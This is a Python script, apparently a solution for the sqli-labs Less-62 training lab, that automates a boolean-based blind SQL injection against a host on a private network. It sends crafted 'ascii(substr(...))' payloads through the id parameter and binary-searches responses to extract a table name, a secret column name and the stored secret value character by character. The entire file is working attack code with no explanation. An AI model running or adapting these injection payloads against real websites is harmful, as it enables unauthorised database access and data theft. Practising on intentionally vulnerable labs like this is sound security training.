import requests
import string

url = "http://192.168.216.188/sqli-labs/Less-62/?id="
keyword = "Your Login name"


# 返回的name是根据id=1，id=2查询，因此payload可以造一个，

# ascii_letters = ascii_lowercase + ascii_uppercase
# digits = '0123456789'
words = list(string.digits + string.ascii_uppercase + string.ascii_lowercase)
print(words)
global search_attempts
search_attempts = 0
# 第几位，大于等于小于，某值
payload = url + "1') and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),%d,1))%s%d -- +"

def TableSearch(n):
    global search_attempts
    min = 0
    max = len(words)-1
    flag = 1
    # NL9ME0VGVT
    while(flag):
        center = int((min+max)/2)
        k = ord(words[center])
        url1 = payload%(n,">",k)
        url2 = payload%(n,"<",k)
        url3 = payload%(n,"=",k)
        if keyword in requests.post(url=url1).text:
            search_attempts += 1
            min = center + 1
        elif keyword in requests.post(url=url2).text:
            search_attempts += 1
            max = center - 1
        elif keyword in requests.post(url=url3).text:
            # print("chm -- " + words[center]);
            search_attempts += 1
            flag = 0
            return k

flag_table = ""
for i in range(1,11):
    flag_name = TableSearch(i)
    flag_table += chr(flag_name)
    
print(flag_table)
print("chm -- search_attempts = %d"%(search_attempts))


payload_column = url + "1') and ascii(substr((select column_name from information_schema.columns where table_name='%s' limit 2,1),%d,1))%s%d -- +"

def ColumnSearch(n):
    global search_attempts
    min = 0
    max = len(words)-1
    flag = 1
    while(flag):
        center = int((min+max)/2)
        k = ord(words[center])
        url1 = payload_column%(flag_table,n,">",k)
        url2 = payload_column%(flag_table,n,"<",k)
        url3 = payload_column%(flag_table,n,"=",k)
        if keyword in requests.post(url=url1).text:
            search_attempts += 1
            min = center + 1
        elif keyword in requests.post(url=url2).text:
            search_attempts += 1
            max = center - 1
        elif keyword in requests.post(url=url3).text:
            # print("chm -- " + words[center]);
            search_attempts += 1
            flag = 0
            return k
        
        
flag_column = ""
for i in range(8,12):
    flag_name = ColumnSearch(i)
    flag_column += chr(flag_name)
    
flag_column = "secret_" + flag_column    
print(flag_column)
print("chm -- search_attempts = %d"%(search_attempts))


payload_data = url + "1') and ascii(substr((select %s from %s limit 0,1),%d,1))%s%d -- +"

def DataSearch(n):
    global search_attempts
    min = 0
    max = len(words)-1
    flag = 1
    while(flag):
        center = int((min+max)/2)
        k = ord(words[center])
        url1 = payload_data%(flag_column,flag_table,n,">",k)
        url2 = payload_data%(flag_column,flag_table,n,"<",k)
        url3 = payload_data%(flag_column,flag_table,n,"=",k)
        if keyword in requests.post(url=url1).text:
            search_attempts += 1
            min = center + 1
        elif keyword in requests.post(url=url2).text:
            search_attempts += 1
            max = center - 1
        elif keyword in requests.post(url=url3).text:
            # print("chm -- " + words[center]);
            search_attempts += 1
            flag = 0
            return k
        
flag_data = ""
for i in range(1,25):
    flag_number = DataSearch(i)
    flag_data += chr(flag_number)
    
print(flag_data)
print("chm -- search_attempts = %d"%(search_attempts))